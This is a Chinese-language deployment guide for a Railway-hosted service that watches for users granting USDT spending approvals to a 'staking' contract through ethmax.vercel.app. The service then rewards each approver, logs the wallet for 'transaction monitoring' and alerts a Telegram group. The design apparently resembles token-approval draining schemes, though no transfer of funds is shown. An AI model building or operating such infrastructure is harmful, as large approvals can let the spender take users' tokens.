# 🚂 Railway 部署完整指南（30 分钟）

## 🎯 目标

将 Approval 监听服务部署到 Railway，实现 24/7 自动运行

---

## 📋 前提条件

- [x] 已创建 `approval-monitor` 代码
- [x] 已获取 Alchemy API Key
- [x] 有 GitHub 账号
- [x] 有 Railway 账号（免费注册）

---

## 方案选择

### 🏆 方案 A：从 GitHub 部署（推荐）

**优势**：
- ✅ 自动部署
- ✅ Git 推送即更新
- ✅ 易于团队协作

**步骤**：见下方 "从 GitHub 部署"

---

### 方案 B：使用 Railway CLI

**优势**：
- ✅ 快速测试
- ✅ 无需 GitHub

**步骤**：见下方 "使用 Railway CLI"

---

## 📦 方案 A：从 GitHub 部署（推荐）

### 步骤 1：推送代码到 GitHub

#### 1.1 初始化 Git（如果还没有）

```bash
cd approval-monitor
git init
git add .
git commit -m "Initial commit: Approval monitor service"
```

#### 1.2 创建 GitHub 仓库

**方法 1：通过网页**

1. 访问 https://github.com/new
2. 仓库名称：`approval-monitor`
3. 隐私：**Private**（推荐）
4. 不要初始化 README
5. 点击 **"Create repository"**

**方法 2：使用 GitHub CLI**

```bash
gh repo create approval-monitor --private --source=. --push
```

#### 1.3 推送代码

```bash
git remote add origin https://github.com/你的用户名/approval-monitor.git
git branch -M main
git push -u origin main
```

---

### 步骤 2：部署到 Railway

#### 2.1 注册 Railway 账号

访问：https://railway.app/

点击 **"Start a New Project"** 或 **"Login"**

**可选登录方式**：
- ✅ GitHub 账号（推荐）
- ✅ Google 账号
- ✅ 邮箱注册

#### 2.2 创建新项目

登录后，点击 **"New Project"**

选择 **"Deploy from GitHub repo"**

#### 2.3 授权 GitHub

如果是第一次使用：
1. 点击 **"Configure GitHub App"**
2. 选择 **"Only select repositories"**
3. 选择 `approval-monitor` 仓库
4. 点击 **"Install & Authorize"**

#### 2.4 选择仓库

在 Railway 中选择 `approval-monitor` 仓库

Railway 会自动：
- ✅ 检测到 `package.json`（Node.js 项目）
- ✅ 检测到 `Procfile`（启动命令）
- ✅ 开始构建

#### 2.5 等待首次部署

**构建过程**（约 2-3 分钟）：
```
📦 Installing dependencies...
✅ Dependencies installed
🏗️  Building...
✅ Build complete
🚀 Deploying...
❌ 部署失败（预期，因为还没配置环境变量）
```

---

### 步骤 3：配置环境变量

#### 3.1 进入项目设置

点击您的项目 → 点击服务 → 点击 **"Variables"** 标签

#### 3.2 添加环境变量

点击 **"+ New Variable"**

**添加第一个变量**：
```
Variable Name: ALCHEMY_API_KEY
Value: 你的_Alchemy_API_Key
```

点击 **"Add"**

**添加第二个变量**：
```
Variable Name: API_ENDPOINT
Value: https://ethmax.vercel.app
```

点击 **"Add"**

#### 3.3 触发重新部署

**自动部署**：
- 添加环境变量后，Railway 会自动重新部署

**或手动部署**：
- 点击 **"Deployments"** 标签
- 点击最新部署 → **"Redeploy"**

---

### 步骤 4：查看日志

#### 4.1 进入部署日志

点击 **"Deployments"** → 选择最新部署 → **"View Logs"**

#### 4.2 验证启动成功

**预期日志**（约 30 秒后）：

```
🚀 启动 USDT Approval 监听服务...

🔧 初始化 Alchemy SDK...
✅ Alchemy SDK 初始化成功

============================================================
🎯 USDT Approval 事件监听服务
============================================================
📍 监听合约: 0xdAC17F958D2ee523a2206206994597C13D831ec7
🎯 质押合约: 0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
🌐 后端 API: https://ethmax.vercel.app
============================================================

🔍 过滤器配置:
   - 合约地址: 0xdAC17F958D2ee523a2206206994597C13D831ec7
   - 事件签名: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
   - Owner: 任何用户
   - Spender: 0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218

🎧 开始监听 Approval 事件...

✅ Approval 监听服务已启动
💡 当用户授权时，会自动处理并添加到交易监听

✅ 服务启动完成！等待 Approval 事件...
```

✅ **如果看到这些日志，说明部署成功！**

---

## 🧪 测试部署

### 测试 1：健康检查（1 分钟后）

**查看日志**，应该看到：

```
────────────────────────────────────────────────────────────
💓 健康检查
────────────────────────────────────────────────────────────
⏰ 运行时间: 0时1分0秒
📊 总计 Approval 事件: 0
✅ 处理成功: 0
❌ 处理失败: 0
🕐 最后事件时间: 无
📅 当前时间: 2025-10-12 18:30:00
────────────────────────────────────────────────────────────
```

✅ **说明服务运行正常！**

---

### 测试 2：触发真实授权（5 分钟）

#### 2.1 用户端操作

1. 访问 https://ethmax.vercel.app
2. 连接 Trust Wallet 或 MetaMask
3. 点击授权按钮
4. 在钱包中确认授权

#### 2.2 观察 Railway 日志（15 秒内）

**预期日志**：

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔔 收到 Approval 事件!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 事件详情:
   👤 授权者 (owner): 0x9EbD7aFa96725B835e3B0B05f83AF7C2B98A3997
   🎯 被授权者 (spender): 0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
   💰 授权额度: 1000000 USDT
   🔗 交易哈希: 0xabc123...
   📦 区块高度: 18500000

✅ 验证通过：用户授权给我们的合约!

🔄 开始处理授权...
📡 调用后端 API: https://ethmax.vercel.app/api/user/authorize
✅ 后端处理成功!
   📝 用户 ID: ec786873-f7b4-476c-91e7-de497b6457de
   📍 授权状态: 已授权
   🎁 奖励已发放
   📡 已自动添加到交易监听

🎉 授权处理完成!
```

#### 2.3 检查 Telegram 群组

应收到授权成功通知（含按钮）

#### 2.4 检查 Vercel 日志

访问 Vercel Dashboard → Logs

搜索：`/api/user/authorize`

**预期日志**：
```
POST /api/user/authorize 200
source: approval_monitor
wallet_address: 0x9EbD...997
```

✅ **如果三处都看到相应日志/通知，说明整个流程成功！**

---

## 📊 监控与维护

### 日常监控

#### 1. Railway Dashboard

访问：https://railway.app/project/你的项目

**查看**：
- **Deployments**：部署历史
- **Metrics**：资源使用（CPU、内存、网络）
- **Logs**：实时日志

#### 2. 健康检查日志

**每分钟自动输出**：
- 运行时间
- 处理统计
- 最后事件时间

**正常状态**：
```
💓 健康检查
⏰ 运行时间: 5时30分15秒
📊 总计 Approval 事件: 25
✅ 处理成功: 24
❌ 处理失败: 1
```

**异常状态**（需要关注）：
- ❌ 处理失败数量突然增加
- ❌ 长时间没有事件（如果应该有的话）
- ❌ 运行时间重置（说明服务重启了）

---

### 故障排查

#### 问题 1：服务无法启动

**症状**：
- 部署失败
- 日志显示错误

**检查**：
1. 环境变量是否配置正确
2. Alchemy API Key 是否有效
3. Railway 日志中的具体错误

**解决**：
```bash
# 重新部署
railway up --service your-service-id
```

#### 问题 2：未收到 Approval 事件

**检查**：
1. Railway 服务是否运行中
2. Alchemy API Key 是否有效
3. 网络连接是否正常

**测试**：
```bash
# 触发一次真实授权
# 观察日志是否有响应
```

#### 问题 3：后端 API 调用失败

**症状**：
```
❌ 调用后端 API 失败: 500 Internal Server Error
```

**检查**：
1. Vercel 服务是否正常
2. API_ENDPOINT 配置是否正确
3. 后端授权 API 是否有错误

**测试**：
```bash
curl -X POST https://ethmax.vercel.app/api/user/authorize \
  -H "Content-Type: application/json" \
  -d '{"wallet_address":"0xtest"}'
```

---

## 💰 成本分析

### Railway 免费版

| 指标 | 免费额度 | 使用量 | 够用吗 |
|------|----------|--------|--------|
| **执行时间** | 500 小时/月 | 720 小时/月（24/7） | ❌ 不够 |
| **内存** | 512 MB | < 100 MB | ✅ 够用 |
| **CPU** | 共享 | < 5% | ✅ 够用 |

**注意**：
- ❌ 免费版只够运行约 20 天（500/24≈20.8）
- ✅ 可以升级到 Hobby 计划（$5/月，无限时）
- ✅ 或使用其他免费平台（Render、Fly.io）

### 推荐配置

| 方案 | 成本 | 说明 |
|------|------|------|
| **Railway Hobby** | $5/月 | 无限执行时间 |
| **Render Free** | $0 | 每月 750 小时（够用） |
| **Fly.io Free** | $0 | 3 个小实例免费 |

---

## 🎯 后续优化

### 1. 添加告警

**配置 Railway Webhooks**：
- 服务崩溃通知
- 发送到 Telegram/Email

### 2. 添加监控面板

**Grafana + Prometheus**：
- 可视化监控
- 自定义告警规则

### 3. 多实例部署

**高可用**：
- Railway + Render 双备份
- 一个挂了，另一个接管

---

## ✅ 部署完成检查清单

- [x] Railway 项目已创建
- [x] GitHub 仓库已关联
- [x] 环境变量已配置
- [x] 服务已成功部署
- [x] 日志显示正常运行
- [x] 健康检查正常
- [x] 测试授权成功
- [x] Telegram 通知正常

---

## 🚀 大功告成！

✅ **Approval 监听服务已成功部署！**

**现在系统会自动**：
1. 监听用户授权（< 15 秒）
2. 更新数据库
3. 发放奖励
4. 添加到交易监听
5. 发送 Telegram 通知

**无需任何手动操作！** 🎉

